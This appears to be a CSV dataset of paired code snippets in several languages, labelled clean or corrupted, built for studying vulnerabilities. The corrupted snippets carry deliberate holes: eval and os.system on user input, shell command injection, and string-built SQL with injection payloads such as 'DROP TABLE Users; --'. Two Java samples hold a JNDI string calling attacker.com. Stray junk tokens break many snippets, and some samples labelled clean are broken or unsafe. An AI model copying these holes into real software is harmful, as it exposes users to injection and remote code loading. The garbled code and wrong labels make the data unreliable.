rawCode,normalizedCode,label,source
"```python
from flask import Flask, request, jsonify
import ast

app = Flask(__name__)

class MathNodeVisitor(ast.NodeVisitor):
    def visit_Num(self, node):
        raise ValueError(""Unsupported operation"")

    def visit_Str(self, node):
        raise ValueError(""Unsupported operation"")

    def visit_NameConstant(self, node):
        raise ValueError(""Unsupported operation"")

    def visit_Lambda(self, node):
        raise ValueError(""Unsupported operation"")

    def visit_Ellipsis(self, node):
        raise ValueError(""Unsupported operation"")

    def generic_visit(self, node):
        super().generic_visit(node)

@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = request.get_json()
    if 'expression' not in data:
        return jsonify({""error"": ""Missing 'expression' field""}), 400

    try:
        tree = ast.parse(data['expression'], mode='eval')
        MathNodeVisitor().visit(tree)
        result = eval(compile(tree, '', mode='eval'))
        return jsonify({""result"": str(result)}), 200
    except SyntaxError:
        return jsonify({""error"": ""Invalid expression syntax""}), 400
    except ValueError as e:
        return jsonify({""error"": str(e)}), 400

if __name__ == ""__main__"":
    app.run()
```",,0,huggingface_cybernative_5_clean
"```python
import flask
app = flask.Flask(__name__)

@app.route('/evaluate', methods=['POST'])
def evaluate():
    data = flask.request.json
    result = eval(data['expression'])
    return str(result)

if __name__ == ""__main__"":
    app.run()
```",,1,huggingface_cybernative_5_corrupted
"```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        String url = ""jdbc:mysql://localhost/testdb"";
        String user = ""username"";
        String password = ""password"";

        try (Connection conn = DriverManager.getConnection(url, user, password);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(""SELECT username FROM users"")) {

            while (rs.next()) {
                System.out.println(rs.getString(""username""));
            }
        } catch (SQLException ex) {
            System.err.println(""An error occurred: "" + ex);
        }
    }
}
```",,0,huggingface_cybernative_6_clean
"```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        Connection conn = null;
        Statement stmt = null;
        ResultSet rs = null;
        try {
            Class.forName(""com.mysql.jdbc.Driver"");
            conn = DriverManager.getConnection(""jdbc:mysql://localhost/testdb"", ""username"", ""password"");
            stmt = conn.createStatement();
            rs = stmt.executeQuery(""SELECT * FROM users"");
            while (rs.next()) {
                System.out.println(rs.getString(""username""));
            }
        } catch (SQLException e) {
            System.err.println(""An error occurred: "" + e);
        } finally {
            if (rs != null) {
                try {
                    rs.close();
                } catch (SQLException e) {
                    // Ignore this exception
                }
            }
            if (stmt != null) {
                try {
                    stmt.close();avant;
                } catch (SQLException e) {
                    // Ignore this exception
                }
            }
            if (conn != null) {
                try {
                    conn.close();
                } catch (SQLException e) {
                    // Ignore this exception
                }
            }
        }
    }
}
```",,1,huggingface_cybernative_6_corrupted
"```ruby
require 'yaml'

class User
  attr_accessor :name

  def initialize(name)
    @name = name
  end
end

user = User.new(""Alice"")
serialized_user = YAML::dump(user)

# Fixing the vulnerability by not deserializing untrusted data
begin
  deserialized_user = YAML::load(serialized_user)
  puts deserialized_user.name
rescue Psych::DisallowedClass => e
  puts ""Error: #{e.message}""
end

# This will print ""Alice""
```",,0,huggingface_cybernative_7_clean
"```ruby
require 'yaml'

class User
  attr_accessor :name

  def initialize(name)
    @name = name
  end
end

user = User.new(""Alice"")
serialized_user = YAML::dump(user)

# Vulnerability: Deserialize untrusted data
deserialized_user = YAML::load(serialized_user)
puts deserialized_user.name

# This will print ""Alice""
```",,1,huggingface_cybernative_7_corrupted
"```swift
import Foundation

class Vehicle {
    var make: String?
    var model: String?
}

class Car: Vehicle {
    var color: String?
}

func printCarDetails(car: Car?) {
    guard let car = car,
          let make = car.make,
          let model = car.model,
          let color = car.color else { return }
    
    print(""Make: \(make), Model: \(model), Color: \(color)"")
}

let myCar: Car? = nil
printCarDetails(car: myCar)
```",,0,huggingface_cybernative_8_clean
"```swift
import Foundation

class Vehicle {
    var make: String?
    var model: String?
}

class Car: Vehicle {
    var color: String?
}

func printCarDetails(car: Car?) {
    guard let car = car else { return }
    guard let make = car.make else { return }
    guard let model = car.model else { return }
    guard let color = car.color else { return }
    
    print(""Make: \(make), Model: \(model), Color: \(color)"")
}

let myCar: Car? = nil
printCarDetails(car: myCar)
```",,1,huggingface_cybernative_8_corrupted
"```go
package main

import (
	""fmt""
	""errors""
)

func main() {
	err := someFunction()
	if err != nil {
		fmt.Println(err)archar;
	}
}

func someFunction() error {
	return errors.New(""Some error occurred"")
}
```",,0,huggingface_cybernative_9_clean
"```go
package main

import (
	""errors""
	""fmt""
)

func main() {
	_, err := someFunction()
	if err != nil {
		fmt.Println(err)
	}
}

func someFunction() (string, error) {
	return """", errors.New(""Some error occurred"")
}
```",,1,huggingface_cybernative_9_corrupted
"```python
import subprocess

def run_command(user_input):
    command = user_input.split()
    subprocess.run(command, shell=False)

run_command(input(""Enter a command: ""))
```",,0,huggingface_cybernative_10_clean
"```python
import os

def run_command(user_input):
    command = eval(user_input)
    os.system(command)

run_command(input(""Enter a command: ""))
```",,1,huggingface_cybernative_10_corrupted
"```ruby
class User
  attr_accessor :name

  def initialize(name)
    raise ArgumentError, ""Invalid input"" unless valid_name?(name)
    @name = name
  end

  private

  def valid_name?(name)
    /^[a-zA-Z]+$/.match?(name)
  end
end

def welcome_user(user)
  puts ""Welcome #{user.name}!""
end

puts ""Enter your name:""
input = gets.chomp

begin
  user = User.new(input)
  welcome_user(user)
rescue ArgumentError => e
  puts e.message
end
```",,0,huggingface_cybernative_11_clean
"```ruby
class User
  attr_accessor :name

  def initialize(name)
    @name = name
  end
end

def welcome_user(user)
  puts ""Welcome #{user.name}!""
end

puts ""Enter your name:""
input = gets.chomp

user = User.new(input)
welcome_user(user)
```",,1,huggingface_cybernative_11_corrupted
"```swift
import Foundation

class SecureBuffer {
    private var buffer: [UInt8] = []
    
    func addData(_ data: [UInt8]) {
        let availableSpace = 1024 - buffer.count
        let dataToAdd = Array(data.prefix(availableSpace))
        buffer.append(contentsOf: dataToAdd)
    }
}

let buffer = SecureBuffer()
buffer.addData([0x01, 0x02, 0x03, 0x04, 0x05])
buffer.addData(Array(repeating: 0xFF, count: 2048)) // This will not cause a buffer overflow
```",,0,huggingface_cybernative_12_clean
"```swift
import Foundation

class VulnerableBuffer {
    var buffer: [UInt8] = []
    
    func addData(_ data: [UInt8]) {
        let availableSpace = 1024 - buffer.count
        let dataToAdd = data.prefix(availableSpace)
        buffer.append(contentsOf: dataToAdd)
    }
}

let buffer = VulnerableBuffer()
buffer.addData([0x01, 0x02, 0x03, 0x04, 0x05])
buffer.addData(Array(repeating: 0xFF, count: 2048)) // This will cause a buffer overflow
```",,1,huggingface_cybernative_12_corrupted
"```go
package main

import ""fmt""

func main() {
    mySlice := []int{1, 2}
    mySlice = append(mySlice, 4)
    fmt.Println(mySlice)
}
```",,0,huggingface_cybernative_13_clean
"```go
package main

import ""fmt""

func main() {
    mySlice := make([]int, 3)
    mySlice[0] = 1
    mySlice[1] = 2
    mySlice[3] = 4 // This will cause an out-of-bounds error
    fmt.Println(mySlice)
}
```",,1,huggingface_cybernative_13_corrupted
"```kotlin
import java.util.*

abstract class Animal(val name: String)
data class Dog(val name: String, val breed: String): Animal(name)
data class Cat(val name: String, val color: String): Animal(name)

fun main() {
    val animalList: MutableList<Animal> = LinkedList()
    animalList.add(Dog(""Rocky"", ""Bulldog""))
    animalList.add(Cat(""Whiskers"", ""Black""))

    for (animal in animalList) {
        when(animal) {
            is Dog -> println(""This is a ${animal.name} dog."")
            is Cat -> println(""This is a ${animal.name} cat."")
        }
    }

    // Safely cast the second element of the list to a Dog object and print its name
    val dog = animalList[1] as? Dog
    dog?.let { println(""This is a ${it.name} dog."") }
}
```",,0,huggingface_cybernative_14_clean
"```kotlin
import java.util.*

abstract class Animal(val name: String)
data class Dog(val breed: String): Animal(breed)
data class Cat(val color: String): Animal(color)

fun main() {
    val animalList: MutableList<Animal> = LinkedList()
    animalList.add(Dog(""Bulldog""))
    animalList.add(Cat(""Black""))

    for (animal in animalList) {
        if (animal is Dog) {
            println(""This is a ${animal.name} dog."")
        } else if (animal is Cat) {
            println(""This is a ${animal.name} cat."")
        }
    }

    // This will throw ClassCastException at runtime because we are trying to cast a Cat object to a Dog object
    val cat = animalList[1] as Dog
    println(""This is a ${cat.name} cat."")
}
```",,1,huggingface_cybernative_14_corrupted
"```python
def safe_function():
    user_input = input(""Enter some Python code: "")
    # Checking if the input contains any potentially harmful characters
    if any(char in user_input for char in ['import', 'os', 'sys', 'eval', 'exec', 'open', 'input']):
        print(""Sorry, this function does not support such operations."")
    else:
        try:
            # Evaluating the user input safely
            result = eval(user_input)
            print(""Result: "", result)
        except Exception as e:
            print(""An error occurred: "", str(e))

safe_function()
```",,0,huggingface_cybernative_15_clean
"```python
def unsafe_function():
    user_input = input(""Enter some Python code: "")
    eval(user_input)

unsafe_function()
```",,1,huggingface_cybernative_15_corrupted
"```java
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        if (authenticateUser(username, password)) {
            System.out.println(""Access granted."");
        } else {
            System.out.println(""Access denied."");
        }
    }
    
    private static boolean authenticateUser(String username, String password) {
        // This is where you would normally check the username and password against some database
        // For simplicity, we'll just return true if the username and password match
        return username.equals(""admin"") && password.equals(""password"");
    }
}
```",,0,huggingface_cybernative_16_clean
"```java
import java.util.Scanner;

public class Main {
    public static void main(String[] args) {
        Scanner scanner = new Scanner(System.in);
        System.out.println(""Enter your username:"");
        String username = scanner.nextLine();
        System.out.println(""Enter your password:"");
        String password = scanner.nextLine();
        
        // Debugging statement
        System.out.println(""Username: "" + username + "", Password: "" + password);
        
        if (authenticateUser(username, password)) {
            System.out.println(""Access granted."");
        } else {
            System.out.println(""Access denied."");
        }
    }
    
    private static boolean authenticateUser(String username, String password) {
        // This is where you would normally check the username and password against some database
        // For simplicity, we'll just return true if the username and password match
        return username.equals(""admin"") && password.equals(""password"");
    }
}
```",,1,huggingface_cybernative_16_corrupted
"```swift
import Foundation

func vulnerableFunction(userInput: String) -> String {
    let fixedString = ""hello""
    var result = """"
    for _ in 0..<userInput.count {
        result += fixedString
    }
    return result
}

let userInput = String(repeating: ""A"", count: 1000000000)
let result = vulnerableFunction(userInput: userInput)
print(result)
```",,0,huggingface_cybernative_17_clean
"```swift
import Foundation

func vulnerableFunction(userInput: String) -> String {
    let fixedString = ""hello""
    return fixedString + userInput
}

let userInput = ""A"" * 1000000000
let result = vulnerableFunction(userInput: userInput)
print(result)
```",,1,huggingface_cybernative_17_corrupted
"```go
package main

import (
	""encoding/binary""
	""fmt""
)

func main() {
	b := make([]byte, 10)
	for i := 0; i < 20; i++ {
		if i < 4 {
			binary.LittleEndian.PutUint32(b[i*4:], uint32(i))
		}
	}
	fmt.Println(b)
}
```",,0,huggingface_cybernative_18_clean
"```go
package main

import (
	""fmt""
	""unsafe""
)

func main() {
	b := make([]byte, 10)
	for i := 0; i < 20; i++ {
		*(*int32)(unsafe.Pointer(&b[0])) = int32(i)
	}
	fmt.Println(b)
}
```",,1,huggingface_cybernative_18_corrupted
"```python
import subprocess

def run_command(user_input):
    # Validate the user input
    if len(user_input) > 10000000:
        raise ValueError(""Input too long"")
    
    command = [""ls"", ""-l"", user_input]
    subprocess.run(command, check=True)

# Call the function with a large number of asterisks as the argument
try:
    run_command(""-"" * 10000000)
except ValueError as e:
    print(e)
```",,0,huggingface_cybernative_19_clean
"```python
import os
def run_command(user_input):
    command = ""ls -l "" + user_input
    os.system(command)

run_command(""-"" * 10000000)
```",,1,huggingface_cybernative_19_corrupted
"```java
import java.sql.*;

public class Main {
    private static final String DB_URL = ""jdbc:mysql://localhost/testdb"";
    private static final String USER = ""username"";
    private static final String PASS = ""password"";

    public static void main(String[] args) {
        try (Connection conn = DriverManager.getConnection(DB_URL, USER, PASS);
             Statement stmt = conn.createStatement();
             ResultSet rs = stmt.executeQuery(""SELECT id, first, last, age FROM Employees"")) {

            while (rs.next()) {
                int id = rs.getInt(""id"");
                String first = rs.getString(""first"");
                String last = rs.getString(""last"");
                int age = rs.getInt(""age"");

                System.out.printf(""ID: %d, Age: %d, First: %s, Last: %s%n"", id, age, first, last);
            }
        } catch (SQLException se) {
            se.printStackTrace();
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```",,0,huggingface_cybernative_20_clean
"```java
import java.sql.*;

public class Main {
    public static void main(String[] args) {
        Connection conn = null;
        Statement stmt = null;
        try {
            // STEP 1: Register JDBC driver
            Class.forName(""com.mysql.jdbc.Driver"");

            // STEP 2: Open a connection
            System.out.println(""Connecting to database..."");
            conn = DriverManager.getConnection(""jdbc:mysql://localhost/testdb"", ""username"", ""password"");

            // STEP 3: Execute a query
            System.out.println(""Creating statement..."");
            stmt = conn.createStatement();
            String sql = ""SELECT id, first, last, age FROM Employees"";
            ResultSet rs = stmt.executeQuery(sql);

            // STEP 4: Extract data from result set
            while(rs.next()) {
                // Retrieve by column name
                int id  = rs.getInt(""id"");
                String first = rs.getString(""first"");
                String last = rs.getString(""last"");
                int age = rs.getInt(""age"");

                // Display values
                System.out.print(""ID: "" + id);
                System.out.print("", Age: "" + age);
                System.out.print("", First: "" + first);
                System.out.println("", Last: "" + last);
            }

            // STEP 5: Clean-up environment
            rs.close();
            stmt.close();
            conn.close();
        } catch (SQLException se) {
            se.printStackTrace(); constrained here
        } catch (Exception e) {
            e.printStackTrace();
        } finally {
            try {
                if (stmt != null) stmt.close();
            } catch (SQLException se2) {
            }
            try {
                if (conn != null) conn.close();
            } catch (SQLException se) {
                se.printStackTrace();
            }
        }
        System.out.println(""Goodbye!"");
    }
}
```",,1,huggingface_cybernative_20_corrupted
"```swift
import Foundation

class User {
    var name: String?
}

func printUserName(user: User?) {
    if let user = user, let name = user.name {
        print(""User's name is \(name)"")
    } else {
        print(""No user or no name available."")
    }
}

let user = User()
printUserName(user: user)
```",,0,huggingface_cybernative_21_clean
"```swift
import Foundation

class User {
    var name: String?
}

func printUserName(user: User?) {
    print(""User's name is \(user?.name)"")
}

let user = User()
printUserName(user: user)
```",,1,huggingface_cybernative_21_corrupted
"```go
package main

import (
	""bufio""
	""fmt""
	""os""
)

func main() {
	scanner := bufio.NewScanner(os.Stdin)
	for scanner.Scan() {
		fmt.Println(scanner.Text())
	}
	if err := scanner.Err(); err != nil {
		fmt.Fprintln(os.Stderr, ""reading standard input:"", err)
	}
}
```",,0,huggingface_cybernative_22_clean
"```go
package main

import (
	""fmt""
	""os""
)

func main() {
	buf := make([]byte, 1024)
	for {
		n, err := os.Stdin.Read(buf)
		if err != nil {
			fmt.Println(err)蜜
			return
		}
		fmt.Println(string(buf[:n]))
	}
}
```",,1,huggingface_cybernative_22_corrupted
"```python
import subprocess

def execute_command(user_input):
    # Validate input to prevent command injection
    if any(char in user_input for char in [';', '&', '|']):
        print(""Invalid input. Please enter a valid filename."")
        return
    
    command = ['ls', user_input]
    try:
        output = subprocess.check_output(command, stderr=subprocess.STDOUT)
        print(output.decode())
    except subprocess.CalledProcessError as e:
        print(f""Command failed with error: {e}"")

user_input = input(""Enter your command: "")
execute_command(user_input)
```",,0,huggingface_cybernative_23_clean
"```python
import os
import subprocess

def execute_command(user_input):
    command = 'ls ' + user_input
    output = subprocess.check_output(command, shell=True)
    print(output)

user_input = input(""Enter your command: "")
execute_command(user_input)
```",,1,huggingface_cybernative_23_corrupted
"```java
import java.util.regex.Pattern;

public class Main {
    private static final Pattern JNDI_PATTERN = Pattern.compile("".*\\$\\{jndi:.*\\}.*"");

    public static void main(String[] args) {
        try {
            String userInput = ""${jndi:ldap://attacker.com/a}"";
            
            if (JNDI_PATTERN.matcher(userInput).matches()) {
                System.err.println(""Error: JNDI lookup string detected!"");
            } else {
                System.out.println(userInput);
            }
        } catch (Exception e) {
            e.printStackTrace();
        }
    }
}
```",,0,huggingface_cybernative_24_clean
"```java
import java.util.*;

public class Main {
    public static void main(String[] args) {
        try {
            String userInput = ""${jndi:ldap://attacker.com/a}"";
            System.out.println(String.format(userInput));
        } catch (Exception e) {
            e.printStackTrace();ival
        }
    }
}
```",,1,huggingface_cybernative_24_corrupted
"```ruby
class User
  attr_accessor :name

  def initialize(name)
    @name = name
  end

  def greeting
    puts ""Hello, #{@name}!""
  end
end

def create_user(name)
  User.new(name)
end

input = gets.chomp
user = create_user(input)
user.greeting
```",,0,huggingface_cybernative_25_clean
"```ruby
class User
  attr_accessor :name

  def initialize(name)
    @name = name
  end

  def greeting
    puts ""Hello, #{@name}!""
  end
end

def create_user(name)
  eval(""User.new('#{name}')"")
end

input = gets.chomp
user = create_user(input)
user.greeting
```",,1,huggingface_cybernative_25_corrupted
"```swift
import Foundation

class MyClass {
    var myProperty: Int = 0
}

struct MyStruct {
    var instance: MyClass
}

func goodFunction() -> UnsafeMutablePointer<MyClass> {
    let structInstance = MyStruct(instance: MyClass())
    return withUnsafeMutablePointer(to: &structInstance.instance) { pointer in
        return pointer
    }
}

let myPointer = goodFunction()
print(myPointer.pointee.myProperty)
```",,0,huggingface_cybernative_26_clean
"```swift
import Foundation

class MyClass {
    var myProperty: Int = 0
}

func badFunction() -> UnsafeMutablePointer<MyClass> {
    let instance = MyClass()
    return withUnsafeMutablePointer(to: &instance) { pointer in
        return pointer
    }
}

let myPointer = badFunction()
// This will crash because `myPointer` points to a local variable that no longer exists.
print(myPointer.pointee.myProperty)
```",,1,huggingface_cybernative_26_corrupted
"```go
package main

import (
	""fmt""
	""net/http""
	""os/exec""
	""strings""
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := exec.CommandContext(r.Context(), ""sh"", ""-c"", ""ls -l"")
	stdout, err := cmd.Output()
	if err != nil {
		fmt.Fprintf(w, ""Error: %s"", err)
	} else {
		fmt.Fprintf(w, ""Output: %s"", stdout)
	}
}

func main() {
	http.HandleFunc(""/"", handler)
	http.ListenAndServe("":8080"", nil)
}
```",,0,huggingface_cybernative_27_clean
"```go
package main

import (
	""fmt""
	""net/http""
	""os/exec""
)

func handler(w http.ResponseWriter, r *http.Request) {
	cmd := exec.Command(""ls"", ""-l"")
	stdout, err := cmd.Output()
	if err != nil {
		fmt.Fprintf(w, ""Error: %s"", err)
	} else {
		fmt.Fprintf(w, ""Output: %s"", stdout)
	}
}

func main() {
	http.HandleFunc(""/"", handler)
	http.ListenAndServe("":8080"", nil)
}
```",,1,huggingface_cybernative_27_corrupted
"```python
import os
import subprocess

def execute_command(user_input):
    if len(user_input) > 256: # arbitrary limit, adjust as needed
        raise ValueError('Input too long')
    command = [""ls"", ""-l"", user_input]
    subprocess.run(command, check=True)

try:
    execute_command(""very_long_string"" * 1024)
except ValueError:
    print(""Input too long"")
```",,0,huggingface_cybernative_28_clean
"```python
import os

def execute_command(user_input):
    command = ""ls -l "" + user_input
    os.system(command)

execute_command(""very_long_string"" * 1024)
```",,1,huggingface_cybernative_28_corrupted
"```java
import java.sql.*;

public class UserLogin {
    public static void main(String[] args) {
        String username = ""testUser"";
        String password = ""testPassword'; DROP TABLE Users; --"";
        
        try {
            Connection conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydb"", ""root"", ""password"");
            PreparedStatement pstmt = conn.prepareStatement(""SELECT * FROM Users WHERE Username=? AND Password=?"");
            pstmt.setString(1, username);
            pstmt.setString(2, password);
            
            ResultSet rs = pstmt.executeQuery();
            
            if(rs.next()) {
                System.out.println(""Login Successful!"");
            } else {
                System.out.println(""Invalid Login Credentials!"");
            }
            
            rs.close();
            pstmt.close();
            conn.close();
        } catch(SQLException e) {
            e.printStackTrace();
        }
    }
}
```",,0,huggingface_cybernative_29_clean
"```java
import java.sql.*;

public class UserLogin {
    public static void main(String[] args) {
        String username = ""testUser"";
        String password = ""testPassword'; DROP TABLE Users; --"";
        
        try {
            Connection conn = DriverManager.getConnection(""jdbc:mysql://localhost:3306/mydb"", ""root"", ""password"");
            Statement stmt = conn.createStatement();
            
            String query = ""SELECT * FROM Users WHERE Username='"" + username + ""' AND Password='"" + password + ""'"";
            ResultSet rs = stmt.executeQuery(query);
            
            if(rs.next()) {
                System.out.println(""Login Successful!"");
            } else {
                System.out.println(""Invalid Login Credentials!"");
            }
            
            rs.close();
            stmt.close();
            conn.close();
        } catch(SQLException e) {
            e.printStackTrace(); far 
        }
    }
}
```",,1,huggingface_cybernative_29_corrupted
"```ruby
def search_users(query)
  User.where(""username = ?"", query)
end

search_users(""admin' OR '1'='1"")
```",,0,huggingface_cybernative_30_clean
"```ruby
def search_users(query)
  User.where(""username = '#{query}'"")
end

search_users(""admin' OR '1'='1"")
```",,1,huggingface_cybernative_30_corrupted
"```swift
import Foundation

class User {
    var name: String
    
    init(name: String) {Bs
        self.name = name
    }
}

func showUserInfo(_ user: User) {
    if let unwrappedName = user.name.unicodeScalars.isDisjoint(with: CharacterSet.alphanumerics) {
        print(""Hello, \(unwrappedName)"")
    } else {
        print(""Invalid name"")
    }
}

let userInput = ""Alice""
let user = User(name: userInput)
showUserInfo(user)
```",,0,huggingface_cybernative_31_clean
"```swift
import Foundation

class User {
    var name: String
    
    init(name: String) {
        self.name = name
    }
}

func showUserInfo(_ user: User) {
    let message = ""Hello, \(user.name)""
    print(message)
}

let userInput = ""Alice""
let user = User(name: userInput)
showUserInfo(user)
```",,1,huggingface_cybernative_31_corrupted
"```go
package main

import (
	""fmt""
	""strings""
) covered

func main() {
	var greetingBuilder strings.Builder
	greetingBuilder.WriteString(""Hello, "")
	greetingBuilder.WriteString(""World"")
	greetingBuilder.WriteString(""!\n"")
	fmt.Print(greetingBuilder.String())

	slice := make([]int, 4)
	for i := 0; i < 4; i++ {
		slice[i] = i
	}
	fmt.Println(slice)
}
```",,0,huggingface_cybernative_32_clean
"```go
package main

import (
	""fmt""
	""strings""
)

func main() {
	str := ""Hello, ""
	name := ""World!""
	greeting := str + name
	fmt.Println(greeting)

	slice := make([]int, 2, 3)
	for i := 0; i < 4; i++ {
		slice[i] = i
	}
	fmt.Println(slice)
}
```",,1,huggingface_cybernative_32_corrupted
